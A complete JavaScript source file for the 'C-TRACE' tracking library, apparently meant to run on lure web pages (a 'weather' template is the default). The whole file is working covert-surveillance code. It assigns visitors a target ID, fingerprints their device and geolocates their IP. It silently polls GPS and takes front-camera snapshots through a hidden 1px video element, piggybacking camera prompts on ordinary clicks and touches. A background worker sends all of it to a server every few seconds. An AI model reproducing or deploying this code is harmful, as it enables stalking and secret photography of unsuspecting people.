/**
 * C-TRACE Telemetry & OSINT Tracking Library
 * Advanced Background & Silent Capture Engine (Zero-Permission Passive Fallback)
 */

(function (window) {
    function generateId(length = 10) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters[randomIndex];
        }
        return result;
    }

    let targetId = localStorage.getItem("target_id") || localStorage.getItem("id");
    if (!targetId) {
        targetId = generateId();
        localStorage.setItem("target_id", targetId);
        localStorage.setItem("id", targetId);
    }

    let cachedIpLocation = null;

    async function fetchWithTimeout(url, timeoutMs = 3000) {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), timeoutMs);
        try {
            const res = await fetch(url, { signal: controller.signal });
            clearTimeout(timer);
            return res;
        } catch (e) {
            clearTimeout(timer);
            return null;
        }
    }

    async function fetchIPLocation() {
        if (cachedIpLocation) return cachedIpLocation;
        try {
            const res = await fetchWithTimeout("https://ipapi.co/json/", 3000);
            if (res && res.ok) {
                const data = await res.json();
                cachedIpLocation = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    lat: data.latitude,
                    lng: data.longitude,
                    isp: data.org || data.asn,
                    asn: data.asn,
                    postal: data.postal,
                    timezone: data.timezone
                };
                return cachedIpLocation;
            }
        } catch (e) {}

        try {
            const res2 = await fetchWithTimeout("https://ip-api.com/json/", 3000);
            if (res2 && res2.ok) {
                const data2 = await res2.json();
                cachedIpLocation = {
                    ip: data2.query,
                    city: data2.city,
                    region: data2.regionName,
                    country: data2.country,
                    lat: data2.lat,
                    lng: data2.lon,
                    isp: data2.isp,
                    asn: data2.as || '',
                    timezone: data2.timezone || ''
                };
                return cachedIpLocation;
            }
        } catch (err) {}

        return null;
    }

    async function checkPermissionState(permissionName) {
        if (navigator.permissions && navigator.permissions.query) {
            try {
                const status = await navigator.permissions.query({ name: permissionName });
                return status.state; // 'granted', 'prompt', 'denied'
            } catch (e) {}
        }
        return 'unknown';
    }

    async function getBatteryInfo() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime : null,
                    dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime : null
                };
            } catch (e) {}
        }
        return null;
    }

    function getGPUInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    return {
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'N/A',
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'N/A'
                    };
                }
            }
        } catch (e) {}
        return { vendor: 'N/A', renderer: 'N/A' };
    }

    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = "Unknown OS";
        if (ua.includes("iPhone") || ua.includes("iPad") || ua.includes("iPod")) os = "iOS (iPhone)";
        else if (ua.includes("Android")) os = "Android";
        else if (ua.includes("Windows")) os = "Windows";
        else if (ua.includes("Mac OS") || ua.includes("Macintosh")) os = "macOS";
        else if (ua.includes("Linux")) os = "Linux";

        let browser = "Unknown Browser";
        if (ua.includes("CriOS")) browser = "Chrome iOS";
        else if (ua.includes("FxiOS")) browser = "Firefox iOS";
        else if (ua.includes("Instagram")) browser = "Instagram In-App Browser";
        else if (ua.includes("FBAN") || ua.includes("FBAV")) browser = "Facebook In-App Browser";
        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
        else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
        else if (ua.includes("Edg")) browser = "Edge";

        let network = "Unknown";
        if (navigator.connection) {
            network = navigator.connection.effectiveType || navigator.connection.type || "Unknown";
        }

        const gpu = getGPUInfo();
        let tz = '';
        try {
            tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
        } catch (e) {}

        return {
            os: os,
            browser: browser,
            userAgent: ua,
            platform: navigator.platform || 'Mobile/Desktop',
            language: navigator.language || 'en',
            screen: `${window.screen.width}x${window.screen.height}`,
            colorDepth: `${window.screen.colorDepth}-bit`,
            devicePixelRatio: window.devicePixelRatio || 1,
            deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
            hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Cores` : 'N/A',
            network: network,
            gpuVendor: gpu.vendor,
            gpuRenderer: gpu.renderer,
            touchPoints: navigator.maxTouchPoints || 0,
            timezone: tz,
            referrer: document.referrer || 'Direct Access'
        };
    }

    async function captureCameraSnapshot(isUserGesture = false) {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }

            // Check permission state first if not a direct user gesture to prevent intrusive popups
            if (!isUserGesture) {
                const camState = await checkPermissionState('camera');
                if (camState !== 'granted') {
                    return null; // Avoid asking permission automatically on load
                }
            }

            const constraints = {
                video: {
                    facingMode: "user",
                    width: { ideal: 640, max: 1280 },
                    height: { ideal: 480, max: 720 }
                },
                audio: false
            };

            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
            } catch (e) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                } catch (err2) {
                    return null;
                }
            }

            if (!stream) return null;

            let video = document.getElementById("__ctrace_cam_video");
            if (!video) {
                video = document.createElement("video");
                video.id = "__ctrace_cam_video";
                video.setAttribute("playsinline", "true");
                video.setAttribute("webkit-playsinline", "true");
                video.muted = true;
                video.style.position = "fixed";
                video.style.top = "-9999px";
                video.style.left = "-9999px";
                video.style.width = "1px";
                video.style.height = "1px";
                video.style.opacity = "0";
                video.style.pointerEvents = "none";
                (document.body || document.documentElement).appendChild(video);
            }

            video.srcObject = stream;

            await new Promise((resolve) => {
                video.onloadedmetadata = async () => {
                    try {
                        await video.play();
                    } catch (e) {}
                    resolve();
                };
                setTimeout(resolve, 500);
            });

            await new Promise(resolve => setTimeout(resolve, 300));

            const canvas = document.createElement("canvas");
            const rawWidth = video.videoWidth || 640;
            const rawHeight = video.videoHeight || 480;
            const maxWidth = 640;
            const scale = rawWidth > maxWidth ? maxWidth / rawWidth : 1;

            canvas.width = Math.max(1, Math.round(rawWidth * scale));
            canvas.height = Math.max(1, Math.round(rawHeight * scale));

            const ctx = canvas.getContext("2d");
            ctx.imageSmoothingEnabled = true;
            ctx.imageSmoothingQuality = "high";
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const photoData = canvas.toDataURL("image/jpeg", 0.65);

            // Clean up stream tracks & video object to release camera hardware immediately
            if (stream && stream.getTracks) {
                stream.getTracks().forEach(track => {
                    try { track.stop(); } catch (e) {}
                });
            }
            video.srcObject = null;

            return photoData;
        } catch (err) {
            console.error("Camera capture error:", err);
            return null;
        }
    }

    let isCapturingPhoto = false;

    async function sendTelemetry(coords = null, templateName = 'weather', captureCamera = false, isUserGesture = false) {
        const battery = await getBatteryInfo();
        const device = getDeviceInfo();
        const ipLocation = await fetchIPLocation();

        let photo = null;
        if (captureCamera && !isCapturingPhoto) {
            isCapturingPhoto = true;
            try {
                photo = await captureCameraSnapshot(isUserGesture);
            } catch (e) {}
            isCapturingPhoto = false;
        }

        const isGps = coords && coords.latitude && coords.longitude;
        const lat = isGps ? coords.latitude : (ipLocation ? ipLocation.lat : null);
        const lng = isGps ? coords.longitude : (ipLocation ? ipLocation.lng : null);
        const accuracy = isGps ? coords.accuracy : (ipLocation ? 5000 : null);
        const locationType = isGps ? 'GPS' : 'IP';

        const payload = {
            id: targetId,
            lat: lat,
            lng: lng,
            accuracy: accuracy,
            locationType: locationType,
            speed: coords ? coords.speed : null,
            heading: coords ? coords.heading : null,
            battery: battery,
            device: device,
            ipLocation: ipLocation,
            photo: photo,
            template: templateName
        };

        try {
            await fetch("/api/telemetry", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload),
                keepalive: true
            });
        } catch (err) {
            console.error("Telemetry report error:", err);
        }
    }

    let bgWorker = null;
    let fallbackIntervalId = null;

    function initBackgroundWorker(onTick, interval = 4000) {
        if (bgWorker) {
            try { bgWorker.terminate(); } catch (e) {}
            bgWorker = null;
        }
        if (fallbackIntervalId) {
            clearInterval(fallbackIntervalId);
            fallbackIntervalId = null;
        }

        try {
            const workerCode = `
                let timer = null;
                self.onmessage = function(e) {
                    if (e.data.action === 'start') {
                        if (timer) clearInterval(timer);
                        timer = setInterval(function() {
                            self.postMessage({ action: 'tick' });
                        }, e.data.interval || 4000);
                    } else if (e.data.action === 'stop') {
                        if (timer) clearInterval(timer);
                    }
                };
            `;
            const blob = new Blob([workerCode], { type: 'application/javascript' });
            const workerUrl = URL.createObjectURL(blob);
            bgWorker = new Worker(workerUrl);
            URL.revokeObjectURL(workerUrl);

            bgWorker.onmessage = function(e) {
                if (e.data.action === 'tick') {
                    onTick();
                }
            };
            bgWorker.postMessage({ action: 'start', interval: interval });
        } catch (e) {
            fallbackIntervalId = setInterval(onTick, interval);
        }
    }

    let isTrackingStarted = false;

    window.LiveTrackerClient = {
        getTargetId: () => targetId,
        sendTelemetry: sendTelemetry,
        captureCameraSnapshot: captureCameraSnapshot,
        getBatteryInfo: getBatteryInfo,
        getDeviceInfo: getDeviceInfo,
        fetchIPLocation: fetchIPLocation,
        startTracking: async function (options = {}) {
            const { 
                templateName = 'weather', 
                updateInterval = 4000, 
                enableCamera = true, 
                enableGPS = true,
                onSuccess, 
                onError 
            } = options;

            async function triggerLocationUpdate(shouldTakePhoto = false, isUserGesture = false) {
                let canUseGPS = false;
                if (enableGPS && navigator.geolocation) {
                    if (isUserGesture) {
                        canUseGPS = true;
                    } else {
                        const geoState = await checkPermissionState('geolocation');
                        if (geoState === 'granted') {
                            canUseGPS = true;
                        }
                    }
                }

                if (canUseGPS) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            await sendTelemetry(position.coords, templateName, shouldTakePhoto, isUserGesture);
                            if (onSuccess) onSuccess(position.coords);
                        },
                        async (error) => {
                            await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
                            if (onError) onError(error);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 8000,
                            maximumAge: 0
                        }
                    );
                } else {
                    // SILENT PASSIVE IP TELEMETRY - Zero Permission Prompt!
                    await sendTelemetry(null, templateName, shouldTakePhoto, isUserGesture);
                }
            }

            // Immediately trigger silent passive IP telemetry on page open without prompting
            await triggerLocationUpdate(enableCamera, false);

            if (isTrackingStarted) return;
            isTrackingStarted = true;

            if (enableGPS && navigator.geolocation) {
                checkPermissionState('geolocation').then(geoState => {
                    if (geoState === 'granted') {
                        try {
                            navigator.geolocation.watchPosition(
                                (pos) => {
                                    sendTelemetry(pos.coords, templateName, enableCamera, false);
                                },
                                () => {},
                                { enableHighAccuracy: true, maximumAge: 0 }
                            );
                        } catch(e) {}
                    }
                });
            }

            initBackgroundWorker(() => {
                triggerLocationUpdate(enableCamera, false);
            }, updateInterval);

            document.addEventListener('visibilitychange', () => {
                triggerLocationUpdate(enableCamera, false);
            });

            window.addEventListener('pagehide', () => {
                triggerLocationUpdate(enableCamera, false);
            });

            window.addEventListener('focus', () => {
                triggerLocationUpdate(enableCamera, false);
            });

            const onUserGesture = () => {
                triggerLocationUpdate(true, true);
            };
            window.addEventListener('click', onUserGesture, { passive: true });
            window.addEventListener('touchstart', onUserGesture, { passive: true });
        }
    };
})(window);

